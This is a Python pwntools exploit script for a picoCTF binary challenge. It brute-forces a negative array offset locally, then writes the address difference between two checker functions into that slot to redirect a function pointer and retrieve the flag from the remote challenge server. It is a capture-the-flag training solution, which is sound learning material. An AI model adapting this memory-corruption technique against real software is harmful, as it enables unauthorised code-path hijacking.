#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 54927 vuln
from pwn import *
from tqdm import tqdm

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 54927)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def send_payload(proc, offset):
    proc.sendlineafter(b"Tell me a story and then I'll tell you if you're a 1337 >> ", b"aaaaaaaaaaaaaL")
    address_delta = exe.symbols["easy_checker"] - exe.symbols["hard_checker"]
    proc.sendlineafter(b"On a totally unrelated note, give me two numbers. Keep the first one less than 10.", str(offset).encode())
    proc.sendline(str(address_delta))

offset = None
for idx in tqdm(range(0, -20, -1), desc="Finding offset"):
    proc = process(exe.path)
    send_payload(proc, idx)
    output = proc.recvall()
    if b"pico" in output:
        offset = idx
        break

if offset is None:
    raise Exception("Could not find offset")

io = start()
send_payload(io, offset)
output = io.recvall()

flag = re.search("picoCTF{.*?}", output.decode("ascii")).group()
log.success("Flag %s", flag)